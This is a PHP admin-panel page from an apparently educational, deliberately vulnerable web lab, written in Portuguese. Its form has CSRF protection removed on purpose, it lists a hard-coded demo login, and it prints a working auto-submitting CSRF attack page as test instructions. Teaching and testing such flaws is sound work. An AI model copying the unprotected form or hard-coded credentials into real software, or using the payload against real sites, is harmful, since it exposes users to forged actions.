<?php
session_start();

// Verificar se o usuário está logado
if (!isset($_SESSION["user_id"])) {
    header("Location: ../public/login.php");
    exit;
}

// Mensagem de sucesso (se houver, vinda do processamento)
$success_message = $_SESSION["action_message"] ?? null;
unset($_SESSION["action_message"]); // Limpa a mensagem após exibir

?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Painel Admin (Simulado) - Casos da Impacta</title>
    <link rel="stylesheet" href="../assets/style.css">
</head>
<body>
    <header>
        <h1><a href="../public/index.php">Casos da Impacta</a></h1>
        <nav>
            <a href="../public/index.php">Início</a>
            <a href="painel.php">Painel Admin (Simulado)</a>
            <a href="../public/logout.php">Logout</a>
        </nav>
    </header>

    <main>
        <h2>Painel Administrativo Simulado</h2>
        <p>Bem-vindo, <?php echo htmlspecialchars($_SESSION["username"]); ?>!</p>

        <?php if ($success_message): ?>
            <p class="success-message"><?php echo htmlspecialchars($success_message); ?></p>
        <?php endif; ?>

        <section class="admin-actions">
            <h3>Ação Simulada (Vulnerável a CSRF)</h3>
            <p>Este formulário simula uma ação administrativa, como deletar um usuário ou alterar uma configuração. Ele não possui proteção CSRF.</p>
            
            <form action="processar_acao.php" method="POST">
                <!-- CAMPO VULNERÁVEL: Ausência de token CSRF -->
                <!-- <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION["csrf_token"]); ?>"> -->
                
                <input type="hidden" name="action" value="delete_user_simulated">
                <input type="hidden" name="user_id_to_delete" value="999"> <!-- ID de usuário fictício -->
                
                <p>Clique no botão abaixo para simular a exclusão do usuário com ID 999.</p>
                <button type="submit">Simular Exclusão de Usuário</button>
            </form>
            
            <h4>Como testar o CSRF:</h4>
            <ol>
                <li>Faça login como 'admin' / 'senha123'.</li>
                <li>Crie uma página HTML separada (ex: `csrf_attack.html`) com o seguinte conteúdo:</li>
                <pre><code>&lt;html&gt;
  &lt;body onload="document.forms[0].submit()"&gt;
    &lt;form action="http://SEU_DOMINIO/casos-impacta/admin/processar_acao.php" method="POST"&gt;
      &lt;input type="hidden" name="action" value="delete_user_simulated" /&gt;
      &lt;input type="hidden" name="user_id_to_delete" value="999" /&gt;
      &lt;input type="submit" value="Clique aqui se não for redirecionado" /&gt;
    &lt;/form&gt;
  &lt;/body&gt;
&lt;/html&gt;</code></pre>
                <li>Abra essa página HTML enquanto estiver logado no "Casos da Impacta".</li>
                <li>A ação de "excluir usuário" será executada sem sua interação direta no painel, apenas por visitar a página maliciosa.</li>
            </ol>
        </section>
    </main>

    <footer>
        <p>&copy; <?php echo date("Y"); ?> Casos da Impacta - Portal Fictício para Fins Educacionais</p>
    </footer>
</body>
</html>

